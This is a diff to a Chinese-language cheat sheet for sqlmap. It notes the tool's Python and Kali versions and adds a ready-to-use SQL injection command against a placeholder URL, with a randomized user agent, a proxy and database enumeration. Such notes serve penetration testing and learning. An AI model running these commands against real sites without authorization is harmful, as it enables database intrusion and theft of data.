@@ -8,6 +8,24 @@
 
 出现红色提示就是错误，建议加参数
 
+版本：
+
+```
+python 版本，较简便，基础功能都有(https://github.com/sqlmapproject/sqlmap)
+
+kali版本，较全面，可以msf联动
+```
+
+---
+
+## 常用：
+
+```
+python sqlmap.py -u http://www.xxx.com/id=1 -p Id --random-agent --dbms mysql -proxy=http://127.0.0.1:10809 --threads=5 --dbs
+```
+
+
+
 ---
 
 sqlmap -u "http://URL/id=1"	
